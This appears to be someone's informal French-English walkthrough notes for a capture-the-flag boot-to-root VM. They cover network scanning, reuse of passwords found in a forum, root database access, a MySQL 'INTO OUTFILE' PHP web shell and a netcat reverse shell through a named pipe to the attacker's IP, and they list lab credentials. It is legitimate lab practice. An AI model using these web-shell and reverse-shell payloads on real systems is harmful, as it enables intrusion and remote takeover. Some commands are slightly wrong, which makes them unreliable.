installer kalilinux
sudo apt-get install gobuster

scanner le réseau avec netdiscover
cmd : netdiscover

get the ip of the virtual machine

nmap the ip of the machine (there are on ports) port 80 et 443 open -> web server
cmd : nmap --top-ports 1000 -T4 -sC http://example.com

get a real list for possible url
wget https://localdomain.pw/Content-Bruteforcing-Wordlist/dirsearch-wordlist.txt > list.txt


nikto -h + adress ou dirb sur l'ip de la machine en http et https
cmd : nikto -h + http[s]//.example.com

phpmyadmin + forum + mail

User login try !q\]Ej?*5K5cy*AJ in forum 6
(maybe password misstype?)

user: lmezard mdp : !q\]Ej?*5K5cy*AJ

Essayer d'envoyer un mail à l'admin :
email de notre compte laurie@borntosec.net

Connecting to mail at webmail

Connecting to db via the mail from the admin
root/Fg-'kKXBj87E:aJ$

We need this command
INSERT INTO `mlf2_entries_cache`(`cache_id`, `cache_text`) VALUES (12,LOAD_FILE("/var/www/forum/index.php"))

If we look at the code we have directory, we can try to put in some with that mysql command

select "<?php system($_GET['cmd']); ?>" into outfile "/my_dir/test.php"

the good dir is /var/www/forum/templates_c/test.php

reverse shell on that website without -e
https://www.nicolashug.com/pentest-et-securite/netcat-reverse-shell-e
launch on kali : nc -nvlp 1234
cmd in the php exploit : mknod /tmp/backpipe p; /bin/sh 0</tmp/backpipe | nc my_ip 1234 1>/tmp/backpipe

directory /home/LOOKATME
there is something on the password
lmezard:G!@M6f4Eatau{sF"

got a file called fun
need to parse it
I try to send it into a html in the dir i have the right and parse it.. But i was wrong
The file is actually a .tar
So i open a ssh port on the kali machine and connect it via lmezard account to copy it and then untar it (tar -xzf fun)
We have the position of each file with //fileXX
I save it and try to copy it into a file .. doesn't work. I have to get a "\n" at the end of each to escape the //file of the previous file. It works !
I have a message who tell me to ssh a pass.. let's do it

The result is used to login with user laurie in ssh
